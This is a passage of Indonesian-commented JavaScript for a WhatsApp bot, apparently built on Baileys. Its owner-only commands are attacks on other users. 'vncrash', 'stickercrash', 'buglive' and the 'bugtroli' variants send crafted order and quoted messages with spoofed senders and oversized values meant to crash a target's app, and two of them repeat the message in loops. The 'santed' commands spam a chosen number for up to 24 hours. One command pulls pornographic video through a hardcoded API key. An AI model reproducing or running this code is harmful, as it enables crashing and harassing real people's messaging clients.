ranz.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur Bug Admin Dan Penyapa, Harap Berhati-hati`, contextInfo: { mentionedJid : mems }}, {quoted: m })
} else if (args[0] === "off") {
if (!welcm) return anjay('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
anjay('Sukses Mematikan Bug Gc di group ini')
} else {
const komo = {
image:fs.readFileSync("./lib/thumbnail.jpg"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!

© ISAL MODS WA

 `, 
}
ranz.sendMessage(m.chat, komo)
}
}
break
//=================================================//
case 'bugvn':
if (!isCreator) throw mess.owner
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('chan.mp3')
 ranz.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
break
//=================================================//
case 'bugsticker':
if (!isCreator) throw mess.owner
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('anjas.webp')
ranz.sendImageAsSticker(m.chat, hey, adehvn, { packname: global.packname, author: global.author })
break
//=================================================//
case 'vncrash':
if (!isCreator) throw mess.owner
if (!text) throw `MANA NOMERNYA KONTOL`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('chan.mp3')
 ranz.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
//=================================================//
case 'stickercrash':
if (!isCreator) throw mess.owner
if (!text) throw `MANA NOMERNYA KONTOL`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('anjas.webp')
ranz.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
//=================================================//
case 'buglive': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© ISAL MODS WA${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
//=================================================//
case 'bugtroli': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
virgamny = fs.readFileSync('pirtex/white.jpg')
var messa = await prepareWAMessageMedia({ image: thumb }, { upload: ranz.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "594071395007984",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© ISAL MODS WA ${ranzmods}`,
"jpegThumbnail":virgamny,
"orderTitle": `© ISAL MODS WA ${virtexcrash}`,
"sellerJid": "6285724506534@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "999999999999",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
//=================================================//
	case 'bugtroli2': {
if (!isCreator) return
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
	"orderMessage": {
	"orderId": "599519108102353",
	"jpegThumbnail":virgamny,
	"itemCount": 1999,
	"status": "INQUIRY",
	"surface": "CATALOG",
	"message": " BY ISAL MODS WA V2 ",
	"orderTitle": " BUG TROLI ", // 
	"sellerJid": "6285724506534@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
}
}), { userJid: m.chat, quoted: m })
ranz.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
//=================================================//
case 'bugtroli3': {
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await ranz.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ISAL MODS WA ${virtexcrash}`,jpegThumbnail: thumb}}}
	var troli2 = generateWAMessageFromContent(m.chat,{
	"orderMessage": {
	"orderId": "599519108102353",
	"itemCount": 1999,
	"status": "INQUIRY",
	"surface": "CATALOG",
	"message": " BY ISAL MODS WA ",
	"orderTitle": " BUG TROLI ", // 
	"sellerJid": "6285724506534@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
	}
	},
	{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
	}, contextInfo:{}}) 
	ranz.relayMessage(m.chat, troli2.message, { messageId: troli2.key.id, a})
	}
	}
	break
//=================================================//
case 'bugtroli4': {
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await ranz.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ISAL MODS WA 🔥`,jpegThumbnail: thumb}}}
	var troli2 = generateWAMessageFromContent(m.chat,{
	"orderMessage": {
	"orderId": "599519108102353",
	"itemCount": 9999999999,
	"status": "INQUIRY",
	"surface": "CATALOG",
	"message": " BY ISAL MODS WA ",
	"orderTitle": " BUG TROLI ", // 
	"sellerJid": "6285724506534@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
	}
	},
	{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
	}, contextInfo:{}}) 
	ranz.relayMessage(m.chat, troli2.message, { messageId: troli2.key.id, a})
	}
	}
	break
//=================================================//
case 'bokep':{
if (!isCreator) return
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
ranz.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `© ISAL MODS WA` }, { quoted: m })
}
break
//=================================================//
case 'penjara':
if (!isCreator) return
if (!text) return m.reply(`*Contoh* :\n#penjara namagroup`)
let cret = await ranz.groupCreate(args.join(" "), [])
let response = await ranz.groupInviteCode(cret.id)
teks = `「 *Create Group* 」

_▸ Name : ${cret.subject}_
_▸ Owner : @${cret.owner.split("@")[0]}_
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_
https://chat.whatsapp.com/${response}
`
m.reply(teks)
break
//=================================================//
case 'santed30menit': 
if (!isCreator) throw mess.owner
                Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
                a = await ranz.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                b = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
                m.reply(`Target di santet selema 30 menit`)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: b})
                await sleep(30000)
                
   break
case 'santed1jam': 
if (!isCreator) throw mess.owner
                Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
                a = await ranz.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                b = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
                m.reply(`Target di santet selema 1 Jam`)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: b})
                await sleep(30000)
break
case 'santed24jam': 
if (!isCreator) throw mess.owner
                Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
                a = await ranz.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                b = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
                m.reply(`Target di santet selema 24 Jam`)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
